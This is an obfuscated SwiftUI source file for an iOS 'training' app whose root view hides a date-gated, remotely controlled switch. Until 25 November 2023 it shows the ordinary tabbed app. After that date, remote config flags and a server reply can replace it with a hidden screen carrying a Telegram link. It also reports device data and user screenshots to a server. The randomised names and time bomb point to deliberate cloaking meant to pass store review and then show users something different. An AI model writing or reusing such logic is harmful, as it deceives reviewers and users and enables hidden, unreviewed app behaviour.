//
//  vGXIkIIDXI.swift
//  App250
//
//  Created by Вячеслав on 11/20/23.
//

import SwiftUI
import Amplitude

struct vGXIkIIDXI: View {
    
    @State var nndKcYVCOC: Tab = Tab.Training
    
    @State var ZWyVKyrfLr: String = ""
    
    @State var isDead: Bool = false
    @State var isTelegram: Bool = false
    
    @State var telegram: URL = URL(string: "h")!
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color("bg")
                .ignoresSafeArea()
            
            if ZWyVKyrfLr.isEmpty || telegram.absoluteString == "h" {
                
                JTrUTyLIno()
                
            } else {
                
                if ZWyVKyrfLr == "0" {
                    
                    if status {
                        
                        lRFySPBFES()
                        
                    } else {
                        
                        taHGXqgvUn(telegram: telegram, isTelegram: isTelegram)
                    }
                    
                } else if ZWyVKyrfLr == "1" {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $nndKcYVCOC, content: {
                                
                                ZJxiBsqTOT()
                                    .tag(Tab.Training)
                                
                                exjGxYiTHD()
                                    .tag(Tab.Testing)
                                
                                iXiPBPAArZ()
                                    .tag(Tab.Progress)
                                
                                oVUzWDGjcO()
                                    .tag(Tab.Profile)
                            })
                            
                            VchSqSWVDR(dIPLeajkkY: $nndKcYVCOC)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        .onAppear {
                            
                            Amplitude.instance().logEvent("did_show_main_screen")
                        }
                        
                    } else {
                        
                        vXmOERuFcV()
                    }
                }
            }
        }
        .onAppear {
            
            ESeKhmQLah(isCaptured: false)
        }
        .onReceive(NotificationCenter.default.publisher(for: UIApplication.userDidTakeScreenshotNotification)) { _ in

            if ZWyVKyrfLr == "0" {
                
                ESeKhmQLah(isCaptured: true)
            }
        }
    }
    
    private func ESeKhmQLah(isCaptured: Bool) {
        
        fSWZITwqnw(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            fSWZITwqnw(field: "isTelegram", dataType: .bool) { result2 in
                
                let result2 = result2 as? Bool ?? false
                isTelegram = result2
            
                fSWZITwqnw(field: "telegram", dataType: .url) { result3 in
                    
                    let result3 = result3 as? URL ?? URL(string: "nil")!
                    telegram = result3
                    
                    let repository = oFBNVHKYuq()
                    let myData = HFGgWWzDse.RBMaGnaIWq()
                    let now = Date().timeIntervalSince1970

                    var dateComponents = DateComponents()
                    dateComponents.year = 2023
                    dateComponents.month = 11
                    dateComponents.day = 25

                    let targetDate = Calendar.current.date(from: dateComponents)!
                    let targetUnixTime = targetDate.timeIntervalSince1970
                    
                    guard now > targetUnixTime else {

                        ZWyVKyrfLr = "1"

                        return
                    }
                    
                    repository.baQhClJUwt(isCaptured: isCaptured, isCast: false, mydata: myData) { result in
                        
                        switch result {
                        case .success(let data):
                            if "\(data)" == "" {
                                
                                self.ZWyVKyrfLr = "1"
                                
                            } else {
                                
                                self.ZWyVKyrfLr = "\(data)"
                            }
                            
                        case .failure(_):
                            
                            if self.isDead == true {
                                
                                self.ZWyVKyrfLr = "0"
                                
                            } else {
                                
                                self.ZWyVKyrfLr = "1"
                            }
                        }
                    }
                }
            }
        }
    }
}

#Preview {
    vGXIkIIDXI()
}
